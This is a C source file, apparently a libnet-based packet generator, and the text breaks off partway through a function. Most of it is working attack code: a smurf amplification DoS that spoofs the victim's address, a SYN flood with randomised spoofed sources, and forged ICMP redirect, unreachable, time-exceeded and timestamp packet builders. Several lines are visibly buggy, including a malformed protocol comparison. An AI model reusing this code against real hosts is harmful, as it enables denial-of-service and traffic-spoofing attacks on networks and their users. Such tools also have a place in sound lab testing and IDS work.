#include <stdio.h>
#include <libnet.h>

#include <string.h>
//#include "project.h"
#include "tcpreplay.h"
#include "func_gen.h"
#include "err.h"
#include "edit_packet.h"
#include "xX.h"
#include "cidr.h"
#include "list.h"


int checkarp(char *l);
int checkreplay(char *l);
int checktcp(char *l);
int checkudp(char *l);
int checksmurf(char *l);
int checksynflood(char *l);
int checkicmp_echo_cq(char *l);
int checkicmp_redirect(char *l);
int checkicmp_timeexceed(char *l);
int checkicmp_timestamp(char *l);
int checkicmp_unreach(char *l);
int checkip(char *l);

int i;
int j;
int k;
int delay;
char check[50];
char device[10];
char amp_ip[20];
//char dst_ip[20];
char cat[2];
char packet[10];
char line[500];
char time_x[20];
char mode;
char file[50],speed[10],dsrc_ip[20],ddst_ip[20];
int Packet = -1;
int Speed;
int print;
char replay[50];
char line[500];
char src_prt[10];
char src_mac[30];
char dst_prt[10];
char dst_mac[30];
char payload[100];
char payload_s[10];
char check[50];
char src_ip[20];
char dst_ip[20];
char type[10];
char mode;


//thread
pthread_t threads;
int rc;	
void *thread_result;
int set_replay=0;
int count_replay=0;

extern int include_exclude_mode;
extern CIDR *xX_cidr;
extern LIST *xX_list;
extern CIDRMAP *cidrmap_data1, *cidrmap_data2;
extern int jo;
	



 u_char enet_src[6] = {0x01, 0x01, 0x01, 0x01, 0x01, 0x01}; 
 u_char enet_dst[6] = {0x01, 0x01, 0x01, 0x01, 0x01, 0x01};  
 //u_char temp;

int smurf(void *ptr)
{
  libnet_t *l = NULL;
  u_long target_ip = 0, ampli_ip = 0;
  //u_long count = 10;
  int i, c;
  libnet_ptag_t t;
  
  //char *device = NULL;
  //char *pTarget = NULL;
  char errbuf[LIBNET_ERRBUF_SIZE],error[100];
  char label[LIBNET_LABEL_SIZE];
  Gen *gen;            
  gen = (Gen *) ptr; 
  //printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);
	strcpy(error,"");
    printf("libnet 1.1 smurf DoS: ICMP[RAW using context queue]\n");

 if (!gen->dst_ip) {
    sprintf(error, "No target given.");
    //usage(argv[0]);
    errx(1,error);
  }

  if ((target_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
  {
    sprintf(error, "Bad target IP address: %s", gen->dst_ip);
    errx(1,error);
  }

  /* Create a context for each amplifier */
  //for (i = 0; optind < argc; optind++) {

 //   printf ("Adding amplifier %s\n", argv[optind]);
  
    l = libnet_init(
	      LIBNET_RAW4,                  /* injection type */
	      gen->device,                       /* network interface */
	      errbuf);                      /* errbuf */

    if (l == NULL)
    {
      sprintf(error, "libnet_init() failed: %s", errbuf);
      errx(1,error);
    }

    if ((ampli_ip = libnet_name2addr4(l, gen->amplifier, LIBNET_RESOLVE)) == -1)
    {
      sprintf(error, "Bad destination IP address: %s\n", gen->amplifier);
      errx(1,error);
    }
    
    /* build the packet */
    t = libnet_build_icmpv4_echo(
          ICMP_ECHO,                            /* type */
	  0,                                    /* code */
	  0,                                    /* checksum */
	  0x42,                                 /* id */
	  0x42,                                 /* sequence number */
	  NULL,                                 /* payload */
	  0,                                    /* payload size */
	  l,                                    /* libnet handle */
	  0);
    if (t == -1)
    {
      sprintf(error, "Can't build ICMP header: %s\n", libnet_geterror(l));
      goto bad_smurf;
    }

    t = libnet_build_ipv4(
          LIBNET_IPV4_H + LIBNET_ICMPV4_TS_H,   /* length */
          0,                                    /* TOS */
          0x42,                                 /* IP ID */
          0,                                    /* IP Frag */
          64,                                   /* TTL */
          IPPROTO_ICMP,                         /* protocol */
          0,                                    /* checksum */
          target_ip,                            /* source IP */
          ampli_ip,                             /* destination IP */
          NULL,                                 /* payload */
          0,                                    /* payload size */
          l,                                    /* libnet handle */
          0);
    if (t == -1)
    {
        sprintf(error, "Can't build IP header: %s\n", libnet_geterror(l));
        goto bad_smurf;
    }

    /* and finally, put it in the arena */
    snprintf(label, sizeof(label)-1, "echo%d", i);
    if (libnet_cq_add(l, label) == -1)
    {
      sprintf(error, "add error: %s\n", libnet_geterror(l));
      goto bad_smurf;
    }
 // } /* for (optind < argc) */


  /* Attaaaaaaaaaack */
    for_each_context_in_cq(l) {
    /*
     *  Write it to the wire.
     */
    for (i = 0; i<gen->count; i++) {
      c = libnet_write(l);
      if (c == -1)
      {
	sprintf(error, "Write error (pkt #%d): %s\n", i, libnet_geterror(l));
	goto bad_smurf;
      }
      else
      {
	fprintf(stderr, "Wrote %d byte ICMP packet; check the wire.\n", c);
      }
    }
  }


  libnet_cq_destroy();
  return (EXIT_SUCCESS);
bad_smurf:
  libnet_cq_destroy();
  libnet_destroy(l);
  errx(1,error);
  return (EXIT_FAILURE);
}

int synflood(void *ptr)
{
    //random source ip and port 
	
	u_long dst_ip   = 0;
    u_long src_ip   = 0;
    //u_short dst_prt = 0;
    u_short src_prt = 0;
    libnet_t *l;
    libnet_ptag_t t;
    u_char *cp;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
    int i, c, packet_amt, burst_int, burst_amt, build_ip;
	Gen *gen;            
    gen = (Gen *) ptr; 

	strcpy(error,"");
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);

    packet_amt  = gen->count;
    burst_int   = 0;
    burst_amt   = 1;

    printf("libnet 1.1 syn flooding: TCP[raw]\n");


	 if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
	if (gen->src_ip != NULL)
	{
	if ((src_ip = libnet_name2addr4(l, gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->src_ip);
	errx(1,error);
	}
	}else
	{
		 src_ip = libnet_get_prand(LIBNET_PRu32);
	}
   

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            gen->device,                                   /* network interface */
            errbuf);                                /* error buffer */

    if (l == NULL)
    {
        sprintf(error, "libnet_init() failed: %s", errbuf);
        errx(1,error);
    }

  

    if (!gen->dst_prt || !dst_ip || !packet_amt)
    {
        //usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);

    for(t = LIBNET_PTAG_INITIALIZER, build_ip = 1; burst_amt--;)
    {
        for (i = 0; i < packet_amt; i++)
        {
            t = libnet_build_tcp(
                    src_prt = libnet_get_prand(LIBNET_PRu16),
                    gen->dst_prt,
                    libnet_get_prand(LIBNET_PRu32),
                    libnet_get_prand(LIBNET_PRu32),
                    TH_SYN,
                    libnet_get_prand(LIBNET_PRu16),
                    0,
                    0,
                    LIBNET_TCP_H,
                    NULL,
                    0,
                    l,
                    t);

            if (build_ip)
            {
                build_ip = 0;
                libnet_build_ipv4(
                    LIBNET_TCP_H + LIBNET_IPV4_H,
                    0,
                    libnet_get_prand(LIBNET_PRu16),
                    0,
                    libnet_get_prand(LIBNET_PR8),
                    IPPROTO_TCP,
                    0,
                    src_ip,
                    dst_ip,
                    NULL,
                    0,
                    l,
                    0);
            }
            c = libnet_write(l);
            if (c == -1)
            {
                fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
            }
#if !(__WIN32__)
            //usleep(250);
#else
            //Sleep(250);
#endif

            printf("%15s:%5d ------> %15s:%5d\n", 
                    libnet_addr2name4(src_ip, 1),
                    ntohs(src_prt),
                    libnet_addr2name4(dst_ip, 1),
                    gen->dst_prt);
        }
#if !(__WIN32__)
        //sleep(burst_int);
#else
        //Sleep(burst_int * 1000);
#endif
    }
    exit(EXIT_SUCCESS);
}

int ip_raw(void *ptr)
{
    int c,i;
    libnet_t *l;
   // char *device = NULL;
    char *dst = "2.2.2.2", *src = "1.1.1.1";
    u_long src_ip, dst_ip;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
    libnet_ptag_t ip_ptag = 0;
    u_short proto = IPPROTO_UDP;
    //u_char payload[255] = {0x11, 0x11, 0x22, 0x22, 0x00, 0x08, 0xc6, 0xa5};
    //u_long payload_s = 8;
	Gen *gen;            
    gen = (Gen *) ptr; 
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);
	strcpy(error,"");
    printf("libnet 1.1 packet shaping: IP + payload[raw]\n");

	if ( strcmp(gen->protocol,"tcp") == 0)		
	{
		printf("use protocol tcp \n");
		proto = IPPROTO_TCP;
	}else if (gen->protocol,"udp")
	{
		printf("use protocol udp \n");
	} else {
		sprintf(error,"Protocol %s error",gen->protocol);
		errx(1,error);
	}

     /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
	    LIBNET_RAW4,                            /* injection type */
	    gen->device,                                 /* network interface */
            errbuf);                                /* error buffer */

    //printf("Using device %s\n", l->device);

    if (l == NULL)
    {
        sprintf(error, "libnet_init() failed: %s", errbuf);
        errx(1,error);
    }

    if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }
    

    /*
     * Build the packet
     */ 
    ip_ptag = libnet_build_ipv4(
        LIBNET_IPV4_H + gen->payload_s,                  /* length */
        0,                                          /* TOS */
        242,                                        /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        proto,                                      /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        gen->payload,                                    /* payload */
        gen->payload_s,                                  /* payload size */
        l,                                          /* libnet handle */
        ip_ptag);                                   /* libnet id */
    if (ip_ptag == -1)
    {
        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
        goto bad_ip_raw;
    }

    /*
     *  Write it to the wire.
     */
	for (i = 0; i<gen->count; i++) {
    c = libnet_write(l);
    if (c == -1)
    {
        sprintf(error, "Write error: %s", libnet_geterror(l));
        goto bad_ip_raw;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte IP packet; check the wire.\n", c);
    }
	}

    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_ip_raw:
    libnet_destroy(l);
    errx(1,error);
    return (EXIT_FAILURE);
}

int ip_link(void *ptr)
{
    int c,i,lenght;
    libnet_t *l;
    //char *device = NULL;
    //char *dst = "2.2.2.2", *src = "1.1.1.1";
    //char *hwdst = "22:22:22:22:22:22", *hwsrc = "11:11:11:11:11:11";
    u_long src_ip, dst_ip;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
    libnet_ptag_t ip_ptag = 0;
    libnet_ptag_t eth_ptag = 0;
    u_short proto = IPPROTO_UDP;
    //u_char payload[255] = {0x11, 0x11, 0x22, 0x22, 0x00, 0x08, 0xc6, 0xa5};
    u_long payload_s = 8;
	Gen *gen;            
    gen = (Gen *) ptr; 
	strcpy(error,"");
	printf("libnet 1.1 packet shaping: IP + payload[link]\n");
	

	if ( strcmp(gen->protocol,"tcp") == 0)		
	{
		//printf("use protocol tcp \n");
		proto = IPPROTO_TCP;
	}else if (gen->protocol,"udp")
	{
		//printf("use protocol udp \n");
	} else {
		sprintf(error,"Protocol %s error",gen->protocol);
		errx(1,error);
	}


    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
	    LIBNET_LINK,                            /* injection type */
	    gen->device,                                 /* network interface */
            errbuf);                                /* error buffer */

    //printf("Using device %s\n", l->device);

    if (l == NULL)
    {
        sprintf(error, "libnet_init() failed: %s", errbuf);
        errx(1,error);
    }

    if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }

	if (  (lenght =strlen(gen->src_mac))!= 24 )
			errx(1, "Source Mac address Error ");
	
	if (  (lenght =strlen(gen->dst_mac))!= 24 )
			errx(1, "Destination Mac address Error ");

	change_mac(gen->src_mac,0);
	change_mac(gen->dst_mac,1);

    
    /*
     * Build the packet
     */ 
    ip_ptag = libnet_build_ipv4(
        LIBNET_IPV4_H + payload_s,                  /* length */
        0,                                          /* TOS */
        242,                                        /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        proto,                                      /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        gen->payload,                                    /* payload */
        gen->payload_s,                                  /* payload size */
        l,                                          /* libnet handle */
        ip_ptag);                                   /* libnet id */
    if (ip_ptag == -1)
    {
        sprintf(error, "Can't build IP header: %s", libnet_geterror(l));
        goto bad_ip_link;
    }

    eth_ptag = libnet_build_ethernet(
        enet_src,                                      /* ethernet destination */   ///////////   edit
        enet_dst,                                      /* ethernet source */        /////////////
        ETHERTYPE_IP,                               /* protocol type */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (eth_ptag == -1)
    {
        sprintf(error, "Can't build ethernet header: %s", libnet_geterror(l));
        goto bad_ip_link;
    }

    /*
     *  Write it to the wire.
     */
	  for (i = 0; i<gen->count; i++) {
    c = libnet_write(l);
    if (c == -1)
    {
        sprintf(error, "Write error: %s", libnet_geterror(l));
        goto bad_ip_link;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte IP packet; check the wire.\n", c);
    }
	  }

    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_ip_link:
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);
}


int icmp_unreach(void *ptr)
{
    int c, i,lenght;
    libnet_t *l = NULL;
    libnet_ptag_t ip_err = 0, icmp = 0, ip = 0, eth = 0;
    u_long src_ip, dst_ip; 
    u_char payload[8] = {0x11, 0x11, 0x22, 0x22, 0x00, 0x08, 0xc6, 0xa5};
    u_long payload_s = 8;
    int mode = LIBNET_LINK;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
	Gen *gen;            
    gen = (Gen *) ptr; 
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);
	strcpy(error,"");
    printf("libnet 1.1 packet shaping: ICMP unreachable[link]\n"); 

    if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }

 
	if (gen->type_link == LIBNET_RAW4)
	{
		mode = LIBNET_RAW4;
	} else if (gen->type_link != LIBNET_LINK)
	{
		errx(1,"Type link error");
	}

	if (gen->type_link == LIBNET_LINK)
	{
		if (  (lenght =strlen(gen->src_mac))!= 24 )
			errx(1, "Source Mac address Error ");
	
		if (  (lenght =strlen(gen->dst_mac))!= 24 )
			errx(1, "Destination Mac address Error ");
	
	
	change_mac(gen->src_mac,0);
	change_mac(gen->dst_mac,1);

	}

   
    if (!gen->src_ip || !gen->dst_ip)
    {
        //usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            mode,                            /* injection type */
            NULL,                                   /* network interface */
            errbuf);                                /* errbuf */
 
    if (l == NULL)
    {
        sprintf(error, "libnet_init() failed: %s", errbuf);
       errx(1,error);
    }
    
    for (i=0; i<gen->count; i++)
    {
        ip_err = libnet_build_ipv4(
        LIBNET_IPV4_H + payload_s,              /* o length */
        IPTOS_LOWDELAY | IPTOS_THROUGHPUT,      /* o IP tos */
        (u_int16_t)i,                           /* o IP ID */
        0,                                      /* o frag */
        64,                                     /* o TTL */
        IPPROTO_UDP,                            /* o protocol */
        0,                                      /* o checksum */
        dst_ip,                                 /* o source IP */
        src_ip,                                 /* o destination IP */
        payload,                                /* payload */
        payload_s,                              /* payload size */
        l,
        ip_err);
    if (ip_err == -1)
    {
        sprintf(error, "Can't build error IPv4 header: %s",libnet_geterror(l));
        goto bad_icmp_unreach;
    }

    icmp = libnet_build_icmpv4_unreach(
        ICMP_UNREACH,                               /* type */
        ICMP_UNREACH_PORT,                          /* code */
        0,                                          /* checksum */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        icmp);
    if (icmp == -1)
    {
        sprintf(error, "Can't build ICMP header: %s", libnet_geterror(l));
        goto bad_icmp_unreach;
    }

    ip = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_ICMPV4_UNREACH_H +
        LIBNET_IPV4_H + payload_s,                  /* length */
        IPTOS_LOWDELAY | IPTOS_THROUGHPUT,          /* TOS */
        (u_int16_t)i + 1,                           /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_ICMP,                               /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        ip);
    if (ip == -1)
    {
        sprintf(error, "Can't build IP header: %s", libnet_geterror(l));
        goto bad_icmp_unreach;
    }

    if (mode == LIBNET_LINK) {
    eth = libnet_build_ethernet(
       enet_dst,                                   /* ethernet destination */
        enet_src,                                   /* ethernet source */
        ETHERTYPE_IP,                               /* protocol type */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        eth);                                         /* libnet id */

    if (eth == -1)
    {
        sprintf(error, "Can't build ethernet header: %s", libnet_geterror(l));
        goto bad_icmp_unreach;
    }
    }
    /*
     *  Write it to the wire.
     */
    libnet_diag_dump_pblock(l);
    c = libnet_write(l);
    if (c == -1)
    {
        sprintf(error, "Write error: %s", libnet_geterror(l));
        goto bad_icmp_unreach;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte ICMP packet; check the wire.\n", c);
    }
}
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_icmp_unreach:
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);
}

int icmp_timestamp(void *ptr)
{
    int c,i;
    libnet_t *l;
    libnet_ptag_t t;
    u_long src_ip, dst_ip;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
	Gen *gen;            
    gen = (Gen *) ptr; 
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);
	strcpy(error,"");
    printf("libnet 1.1 packet shaping: ICMP timestamp[raw]\n");

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            gen->device,                                   /* network interface */
            errbuf);                                /* errbuf */
 
    if (l == NULL)
    {
        sprintf(error, "libnet_init() failed: %s", errbuf);
        errx(1,error);
    }

   if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }

 
    if (!gen->src_ip || !gen->dst_ip)
    {
       // usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    t = libnet_build_icmpv4_timestamp(
        ICMP_TSTAMP,                                /* type */
        0,                                          /* code */
        0,                                          /* checksum */
        242,                                        /* id */
        424,                                        /* sequence number */
        1000,                                       /* otime */
        2000,                                       /* rtime */
        3000,                                       /* ttime */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build ICMP header: %s", libnet_geterror(l));
        goto bad_icmp_timestamp;
    }

    t = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_ICMPV4_TS_H,         /* length */
        0,                                          /* TOS */
        242,                                        /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_ICMP,                               /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build IP header: %s", libnet_geterror(l));
        goto bad_icmp_timestamp;
    }

    /*
     *  Write it to the wire.
     */
	  for (i = 0; i<gen->count; i++) {
    c = libnet_write(l);
    if (c == -1)
    {
        sprintf(error, "Write error: %s", libnet_geterror(l));
        goto bad_icmp_timestamp;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte ICMP packet; check the wire.\n", c);
    }
	  }
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_icmp_timestamp:
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);
}

int icmp_timeexceed(void *ptr)
{
    int c,i;
    libnet_t *l;
    libnet_ptag_t t;
    u_long src_ip, dst_ip; 
    u_char payload[8] = {0x11, 0x11, 0x22, 0x22, 0x00, 0x08, 0xc6, 0xa5};
    u_long payload_s = 8;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
	Gen *gen;            
    gen = (Gen *) ptr; 
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);

	strcpy(error,"");
    printf("libnet 1.1 packet shaping: ICMP timeexceed[link]\n"); 

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_LINK,                            /* injection type */
            gen->device,                                   /* network interface */
            errbuf);                                /* errbuf */
 
    if (l == NULL)
    {
        sprintf(error, "libnet_init() failed: %s", errbuf);
        errx(1,error);
    }

    //src_ip = 0;
    //dst_ip = 0;

	if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }
    if (!gen->src_ip || !gen->dst_ip)
    {
        //usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    t = libnet_build_ipv4(
        LIBNET_IPV4_H + payload_s,                  /* length */
        IPTOS_LOWDELAY | IPTOS_THROUGHPUT,          /* TOS */
        0xee,                                       /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_UDP,                                /* protocol */
        0,                                          /* checksum */
        dst_ip,                                     /* source IP */
        src_ip,                                     /* destination IP */
        payload,                                    /* payload */
        payload_s,                                  /* payload size */
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build error IP header: %s", 
               libnet_geterror(l));
        goto bad_icmp_timeexceed;
    }

    t = libnet_build_icmpv4_timeexceed(
        ICMP_TIMXCEED,                              /* type */
        ICMP_TIMXCEED_INTRANS,                      /* code */
        0,                                          /* checksum */
        NULL,
        0,
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build ICMP header: %s", libnet_geterror(l));
        goto bad_icmp_timeexceed;
    }

    t = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_ICMPV4_TIMXCEED_H +
        LIBNET_IPV4_H + payload_s,                  /* length */
        IPTOS_LOWDELAY | IPTOS_THROUGHPUT,          /* TOS */
        0xee,                                       /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_ICMP,                               /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build IP header: %s", libnet_geterror(l));
        goto bad_icmp_timeexceed;
    }

    t = libnet_build_ethernet(
        enet_dst,                                   /* ethernet destination */
        enet_src,                                   /* ethernet source */
        ETHERTYPE_IP,                               /* protocol type */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (t == -1)
    {
        sprintf(error, "Can't build ethernet header: %s", libnet_geterror(l));
        goto bad_icmp_timeexceed;
    }

    /*
     *  Write it to the wire.
     */
	   for (i = 0; i<gen->count; i++) {
    c = libnet_write(l);
    if (c == -1)
    {
        sprintf(error, "Write error: %s", libnet_geterror(l));
        goto bad_icmp_timeexceed;
    }
    else
    { 
        fprintf(stderr, "Wrote %d byte ICMP packet; check the wire.\n", c);
    }
	   }
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_icmp_timeexceed:
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);
}


int icmp_redirect(void *ptr)
{
    int c,i;
    libnet_t *l;
    libnet_ptag_t t;
    u_long src_ip, dst_ip, gw_ip; 
    u_char payload[8] = {0x11, 0x11, 0x22, 0x22, 0x00, 0x08, 0xc6, 0xa5};
    u_long payload_s = 8;
    char errbuf[LIBNET_ERRBUF_SIZE],error[100];
	Gen *gen;            
    gen = (Gen *) ptr; 
	//printf("%s %s %s %s %s %s\n",gen->device,gen->type,gen->src_ip,gen->src_mac,gen->dst_ip,gen->dst_mac);
	strcpy(error,"");
    printf("libnet 1.1 packet shaping: ICMP redirect[link]\n"); 

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_LINK,                            /* injection type */
            gen->device,                                   /* network interface */
            errbuf);                                /* errbuf */
 
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE);
    }

    //src_ip = 0;
    //dst_ip = 0;
    //gw_ip = 0;

	if ((dst_ip = libnet_name2addr4(l, gen->dst_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad destination IP address: %s", gen->dst_ip);
	errx(1,error);
	}
    
    if ((src_ip = libnet_name2addr4(l,gen->src_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad source IP address: %s", gen->src_ip);
	errx(1,error);
    }

	if ((gw_ip = libnet_name2addr4(l, gen->gw_ip, LIBNET_RESOLVE)) == -1)
    {
	sprintf(error, "Bad gateway IP address: %s\n", gen->gw_ip);
	errx(1,error);
    }
	
    if (!gen->src_ip || !gen->dst_ip || !gen->gw_ip)
    {
        //usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    
    t = libnet_build_ipv4(
        LIBNET_IPV4_H + payload_s,                  /* length */
        IPTOS_LOWDELAY | IPTOS_THROUGHPUT,          /* TOS */
        0x42,                                       /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_ICMP,                               /* protocol */
        0,                                          /* checksum */
        dst_ip,                                     /* source IP */
        src_ip,                                     /* destination IP */
        payload,                                    /* payload */
        payload_s,                                  /* payload size */
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build error IP header: %s",libnet_geterror(l));
        goto bad_icmp_redirect;
    }

   t = libnet_build_icmpv4_redirect(
           ICMP_REDIRECT,                 /* type */
           ICMP_REDIRECT_HOST,            /* code */
           0,                             /* checksum */
           gw_ip,
           NULL,
           0,
           l,             /* libnet handle */
           0);                            /* libnet id */
    if (t == -1)
    {
        sprintf(error, "Can't build ICMP header: %s", libnet_geterror(l));
        goto bad_icmp_redirect;
    }

    t = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_ICMPV4_REDIRECT_H +
        LIBNET_IPV4_H + payload_s,                  /* length */
        IPTOS_LOWDELAY | IPTOS_THROUGHPUT,          /* TOS */
        0xee,                                       /* IP ID */
        0,                                          /* IP Frag */
        64,                                         /* TTL */
        IPPROTO_ICMP,                               /* protocol */
        0,                                          /* checksum */
        src_ip,                                     /* source IP */
        dst_ip,                                     /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);
    if (t == -1)
    {
        sprintf(error, "Can't build IP header: %s", libnet_geterror(l));
        goto bad_icmp_redirect;
    }
    
    t = libnet_build_ethernet(
        enet_dst,                                   /* ethernet destination */
        enet_src,                                   /* ethernet source */
        ETHERTYPE_IP,                               /* protocol type */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (t == -1)
    {
        sprintf(error, "Can't build ethernet header: %s", libnet_geterror(l));
        goto bad_icmp_redirect;
    }
    
    /*
     *  Write it to the wire.
     */
	   for (i = 0; i<gen->count; i++) {
    c = libnet_write(l);
    if (c == -1)
    {
        sprintf(error, "Write error: %s\n", libnet_geterror(l));
        goto bad_icmp_redirect;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte ICMP packet; check the wire.\n", c);
    }
	   }
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad_icmp_redirect:
    libnet_destroy(l);
	errx(1,error);
    return (EXIT_FAILURE);
}

int icmp_echo_cq(void *ptr )
{
    libnet_t *l = NULL;
    u_long src_ip = 0, dst_ip = 0;
    //u_long count = 10;
    int i, c;
    libnet_ptag_t t;
    char *payload = NULL;
    u_short payload_s = 0;
  
    //char *device = NULL;
   // char *pDst = NULL, *pSrc = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    char label[LIBNET_LABEL_SIZE];
	char error[100];
	Gen *gen;            
